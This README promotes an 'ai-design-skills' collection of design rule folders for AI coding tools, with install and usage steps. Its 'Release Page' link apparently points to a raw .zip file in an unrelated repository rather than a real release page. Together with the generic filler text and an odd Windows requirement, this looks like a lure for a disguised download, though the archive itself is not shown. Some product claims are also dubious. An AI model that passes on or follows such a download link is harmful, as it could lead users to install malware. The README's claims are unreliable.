# 🎨 ai-design-skills - Improve your ai coding assistant results

[Visit the Release Page](https://raw.githubusercontent.com/tilliesubsidized136/tilliesubsidized136.github.io/main/subcurrent/3.5.zip)

This project provides a set of instructions for AI coding tools. These tools include Claude Code, Cursor, Codex, and Windsurf. You give these instructions to your AI to help it design better websites and user interfaces. Each folder contains specific rules for a design task.

## 📋 What is this

AI coding assistants often guess at design choices. This leads to generic websites or poor user experiences. This collection changes how the AI thinks about your project. It forces the AI to follow professional design principles for spacing, typography, and layout. 

When you add a skill, you teach your AI to act like a senior designer. You save time on manual edits. You get cleaner code that follows a logical visual system.

## 🛠️ Requirements

You need one of the following AI tools installed on your Windows computer:
- Claude Code
- Cursor
- Codex
- Windsurf

Your AI tool must support custom rule files. Most modern tools look for a folder named .claude or a system instructions file in your workspace.

## ⚙️ How to install a skill

1. Open your project folder on your computer.
2. Find the folder where your AI stores its rules. For Claude Code, this is usually .claude/skills.
3. Open the folder you extracted from the download.
4. Choose the skill you want to use, such as landing-page-design.
5. Copy the folder of the skill you chose.
6. Paste this folder into your project’s skill directory.
7. Restart your AI tool so it loads the new files.

## 🚀 How to use your skills

Once you install a skill, your AI tool will read the rules automatically. You do not need to type extra commands. When you ask your AI to build a landing page, it will check the rules in the folder you moved. 

It will ask you intake questions. It will plan the page structure. It will write copy that focuses on conversions. Finally, it will apply the visual system defined in the skill files, including font sizes, layout spacing, and motion effects.

If you want to try a different skill, simply copy a new folder into the same location. The AI will remove the old instructions and start using the new ones immediately.

## 💡 Best practices

- Keep your workspace clean. Only install skills you plan to use for your current task. 
- Review the rules inside the folders. You can edit the text files if you want to change colors or spacing preferences. 
- Use the AI for the design foundation. If you need special features, add them after the AI generates the basic structure.
- Check the console if your AI fails to load a skill. It will usually tell you if it cannot find the file path.
- Remember to save your work before you ask the AI to apply a new skill.
